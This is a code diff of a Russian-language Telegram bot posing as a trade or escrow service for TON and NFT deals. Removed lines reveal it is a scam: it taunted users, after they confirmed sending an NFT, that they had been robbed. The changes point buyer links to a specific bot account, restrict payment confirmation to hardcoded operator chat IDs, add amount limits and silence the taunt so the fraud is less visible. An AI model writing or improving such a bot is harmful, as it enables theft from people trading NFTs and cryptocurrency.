@@ -59,7 +59,7 @@ def get_text_messages(message):
             bot.send_message(   
                 chat_id=message.chat.id,
                 text=f"✅ Сделка успешно создана!\n\n💰 Сумма: {price_sell} {user_data[id_chat]['currency']}\n\
-📜 Описание: {description}\n🔗 Ссылка для покупателя: https://t.me/ExempleExemple_bot_bot?start={encoded}"
+📜 Описание: {description}\n🔗 Ссылка для покупателя: https://t.me/GllftEllfRobot?start={encoded}"
             )
 
             dealer_mes_id = bot.send_message(   
@@ -154,13 +154,19 @@ def get_text_messages(message):
                 price_sell = float(price_sell)
 
                 if user_data[chat_id]['input_TON']:
-                    bot.send_message(
+                    if price_sell > 1999.9 or price_sell < 1:
+                        bot.send_message(
                         chat_id=chat_id,
-                        text="*💳 Отправьте реквизиты для получения оплаты:*\n\nПример:" \
-                        " `ЕвроБанк - 1234567891012345`",
-                        parse_mode="Markdown"
-                    )
-                    user_data[chat_id]['input_TON'] = False 
+                        text="❌ Сумма должна быть в пределах от 1 до 1999.9 TON" 
+                        )
+                    else:
+                        bot.send_message(
+                            chat_id=chat_id,
+                            text="*💳 Отправьте реквизиты для получения оплаты:*\n\nПример:" \
+                            " `ЕвроБанк - 1234567891012345`",
+                            parse_mode="Markdown"
+                        )
+                        user_data[chat_id]['input_TON'] = False 
                 else: 
                     user_data[chat_id]['price_sell'] = price_sell
                     bot.send_message(
@@ -288,7 +294,7 @@ _Используйте кнопки ниже чтобы добавить/изм
         create_deal(chat_id,message_id)
 
     elif call.data == "confirm_pay":
-        if chat_id == 8194815542 or chat_id == 5423423432:
+        if chat_id == 8194815542 or chat_id == 7825409096:
 
             confirm_menu = types.InlineKeyboardMarkup()
             confirm = types.InlineKeyboardButton(text='✅Подтвердите, что вы отправили нфт',
@@ -310,12 +316,7 @@ _Используйте кнопки ниже чтобы добавить/изм
             )
         
     elif call.data == "confirm_nft":
-        bot.send_message(
-            chat_id=chat_id,
-            text=f"✅ Вас наебали! *Деньги — это зло… Так что я взял этот грех на себя. Ты должен мне сказать спасибо!*\
-**Не переживай, лох, я их потрачу с умом… Шучу, конечно, просажу на всякую хуйню. Но весело!**",
-            parse_mode="Markdown"
-            )
+        pass
 
     elif call.data == "deal_TON":
         deal(chat_id,message_id,'TON')
@@ -583,7 +584,7 @@ def get_description(message):
     bot.send_message(
         chat_id=chat_id,
         text=f"✅ Сделка успешно создана!\n\n💰 Сумма: {price_sell} {user_data[chat_id]['currency']}\n\
-📜 Описание: {description}\n🔗 Ссылка для покупателя: https://t.me/ExempleExemple_bot_bot?start={encoded}",
+📜 Описание: {description}\n🔗 Ссылка для покупателя: https://t.me/GllftEllfRobot?start={encoded}",
         reply_markup=deal_menu
     )
 
